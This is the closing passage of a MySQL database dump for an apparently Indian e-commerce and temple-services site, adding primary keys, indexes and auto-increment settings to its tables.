--
-- Indexes for table `blogposts_comments_kushal`
--
ALTER TABLE `blogposts_comments_kushal`
  ADD PRIMARY KEY (`id`),
  ADD KEY `fid` (`fid`);

--
-- Indexes for table `blogposts_post`
--
ALTER TABLE `blogposts_post`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `blogposts_post_kushal`
--
ALTER TABLE `blogposts_post_kushal`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `brochure`
--
ALTER TABLE `brochure`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `cart_products`
--
ALTER TABLE `cart_products`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `category`
--
ALTER TABLE `category`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `cities`
--
ALTER TABLE `cities`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `ci_sessions`
--
ALTER TABLE `ci_sessions`
  ADD PRIMARY KEY (`session_id`),
  ADD KEY `last_activity_idx` (`last_activity`);

--
-- Indexes for table `clients`
--
ALTER TABLE `clients`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `clientscategory`
--
ALTER TABLE `clientscategory`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `colors`
--
ALTER TABLE `colors`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `contactus`
--
ALTER TABLE `contactus`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `contactus_kushal`
--
ALTER TABLE `contactus_kushal`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `failedpincode`
--
ALTER TABLE `failedpincode`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `gifts`
--
ALTER TABLE `gifts`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `gift_products`
--
ALTER TABLE `gift_products`
  ADD KEY `gift_id` (`gift_id`,`pid`);

--
-- Indexes for table `login_report`
--
ALTER TABLE `login_report`
  ADD KEY `user_id` (`user_id`);

--
-- Indexes for table `materials`
--
ALTER TABLE `materials`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `newsletter`
--
ALTER TABLE `newsletter`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `orders`
--
ALTER TABLE `orders`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `orders_bill_ship`
--
ALTER TABLE `orders_bill_ship`
  ADD KEY `oid` (`oid`);

--
-- Indexes for table `orders_products`
--
ALTER TABLE `orders_products`
  ADD KEY `oid` (`oid`),
  ADD KEY `spid` (`psid`);

--
-- Indexes for table `our_products`
--
ALTER TABLE `our_products`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `packages`
--
ALTER TABLE `packages`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `payment_log`
--
ALTER TABLE `payment_log`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `pincodes`
--
ALTER TABLE `pincodes`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `productpackage`
--
ALTER TABLE `productpackage`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `products`
--
ALTER TABLE `products`
  ADD PRIMARY KEY (`id`),
  ADD KEY `sub_id` (`cat_id`,`material_id`),
  ADD KEY `color_id` (`color_id`);

--
-- Indexes for table `product_images`
--
ALTER TABLE `product_images`
  ADD PRIMARY KEY (`id`),
  ADD KEY `psid` (`pid`);

--
-- Indexes for table `product_sizes`
--
ALTER TABLE `product_sizes`
  ADD PRIMARY KEY (`id`),
  ADD KEY `size_id` (`size_id`),
  ADD KEY `pid` (`pid`),
  ADD KEY `size_id_2` (`size_id`);

--
-- Indexes for table `product_spec`
--
ALTER TABLE `product_spec`
  ADD PRIMARY KEY (`id`),
  ADD KEY `psid` (`pid`);

--
-- Indexes for table `product_vase`
--
ALTER TABLE `product_vase`
  ADD KEY `psid` (`pid`),
  ADD KEY `vase_id` (`vase_id`);

--
-- Indexes for table `project`
--
ALTER TABLE `project`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `project_img`
--
ALTER TABLE `project_img`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `releaseorder`
--
ALTER TABLE `releaseorder`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `return_policy`
--
ALTER TABLE `return_policy`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `reviews`
--
ALTER TABLE `reviews`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `schools`
--
ALTER TABLE `schools`
  ADD PRIMARY KEY (`s_id`);

--
-- Indexes for table `settings`
--
ALTER TABLE `settings`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `sizes`
--
ALTER TABLE `sizes`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `social_links`
--
ALTER TABLE `social_links`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `special_banner`
--
ALTER TABLE `special_banner`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `states`
--
ALTER TABLE `states`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `subcategory`
--
ALTER TABLE `subcategory`
  ADD PRIMARY KEY (`id`),
  ADD KEY `country_id` (`category_id`);

--
-- Indexes for table `sub_subcategory`
--
ALTER TABLE `sub_subcategory`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `templedetails`
--
ALTER TABLE `templedetails`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `temple_photos`
--
ALTER TABLE `temple_photos`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `testimonials`
--
ALTER TABLE `testimonials`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `upanayana`
--
ALTER TABLE `upanayana`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users_login_report`
--
ALTER TABLE `users_login_report`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `vouchers`
--
ALTER TABLE `vouchers`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `voucher_code`
--
ALTER TABLE `voucher_code`
  ADD KEY `cid` (`cid`);

--
-- Indexes for table `welcometext`
--
ALTER TABLE `welcometext`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `wishlist`
--
ALTER TABLE `wishlist`
  ADD PRIMARY KEY (`id`),
  ADD KEY `pid` (`pid`,`user_id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `aboutus`
--
ALTER TABLE `aboutus`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `aboutus_kushal`
--
ALTER TABLE `aboutus_kushal`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `advertise`
--
ALTER TABLE `advertise`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `banner`
--
ALTER TABLE `banner`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=55;

--
-- AUTO_INCREMENT for table `banner_kushal`
--
ALTER TABLE `banner_kushal`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=12;

--
-- AUTO_INCREMENT for table `blogposts_comments`
--
ALTER TABLE `blogposts_comments`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=677;

--
-- AUTO_INCREMENT for table `blogposts_comments_kushal`
--
ALTER TABLE `blogposts_comments_kushal`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=20;

--
-- AUTO_INCREMENT for table `blogposts_post`
--
ALTER TABLE `blogposts_post`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=18;

--
-- AUTO_INCREMENT for table `blogposts_post_kushal`
--
ALTER TABLE `blogposts_post_kushal`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=18;

--
-- AUTO_INCREMENT for table `cart_products`
--
ALTER TABLE `cart_products`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=212;

--
-- AUTO_INCREMENT for table `category`
--
ALTER TABLE `category`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=14;

--
-- AUTO_INCREMENT for table `cities`
--
ALTER TABLE `cities`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=382;

--
-- AUTO_INCREMENT for table `clients`
--
ALTER TABLE `clients`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=52;

--
-- AUTO_INCREMENT for table `clientscategory`
--
ALTER TABLE `clientscategory`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- AUTO_INCREMENT for table `colors`
--
ALTER TABLE `colors`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=34;

--
-- AUTO_INCREMENT for table `contactus`
--
ALTER TABLE `contactus`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `contactus_kushal`
--
ALTER TABLE `contactus_kushal`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `failedpincode`
--
ALTER TABLE `failedpincode`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `gifts`
--
ALTER TABLE `gifts`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `materials`
--
ALTER TABLE `materials`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=15;

--
-- AUTO_INCREMENT for table `newsletter`
--
ALTER TABLE `newsletter`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=40;

--
-- AUTO_INCREMENT for table `orders`
--
ALTER TABLE `orders`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=157;

--
-- AUTO_INCREMENT for table `our_products`
--
ALTER TABLE `our_products`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `packages`
--
ALTER TABLE `packages`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- AUTO_INCREMENT for table `payment_log`
--
ALTER TABLE `payment_log`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=171;

--
-- AUTO_INCREMENT for table `pincodes`
--
ALTER TABLE `pincodes`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=328;

--
-- AUTO_INCREMENT for table `productpackage`
--
ALTER TABLE `productpackage`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=293;

--
-- AUTO_INCREMENT for table `products`
--
ALTER TABLE `products`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=133;

--
-- AUTO_INCREMENT for table `product_images`
--
ALTER TABLE `product_images`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=136;

--
-- AUTO_INCREMENT for table `product_sizes`
--
ALTER TABLE `product_sizes`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=147;

--
-- AUTO_INCREMENT for table `product_spec`
--
ALTER TABLE `product_spec`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `project`
--
ALTER TABLE `project`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=31;

--
-- AUTO_INCREMENT for table `project_img`
--
ALTER TABLE `project_img`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=206;

--
-- AUTO_INCREMENT for table `releaseorder`
--
ALTER TABLE `releaseorder`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `return_policy`
--
ALTER TABLE `return_policy`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `reviews`
--
ALTER TABLE `reviews`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=47;

--
-- AUTO_INCREMENT for table `schools`
--
ALTER TABLE `schools`
  MODIFY `s_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=38;

--
-- AUTO_INCREMENT for table `settings`
--
ALTER TABLE `settings`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `sizes`
--
ALTER TABLE `sizes`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=133;

--
-- AUTO_INCREMENT for table `social_links`
--
ALTER TABLE `social_links`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `special_banner`
--
ALTER TABLE `special_banner`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `states`
--
ALTER TABLE `states`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=43;

--
-- AUTO_INCREMENT for table `subcategory`
--
ALTER TABLE `subcategory`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=50;

--
-- AUTO_INCREMENT for table `sub_subcategory`
--
ALTER TABLE `sub_subcategory`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `templedetails`
--
ALTER TABLE `templedetails`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `temple_photos`
--
ALTER TABLE `temple_photos`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=14;

--
-- AUTO_INCREMENT for table `testimonials`
--
ALTER TABLE `testimonials`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=15;

--
-- AUTO_INCREMENT for table `upanayana`
--
ALTER TABLE `upanayana`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=28;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=45;

--
-- AUTO_INCREMENT for table `users_login_report`
--
ALTER TABLE `users_login_report`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=428;

--
-- AUTO_INCREMENT for table `vouchers`
--
ALTER TABLE `vouchers`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `welcometext`
--
ALTER TABLE `welcometext`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `wishlist`
--
ALTER TABLE `wishlist`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=52;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
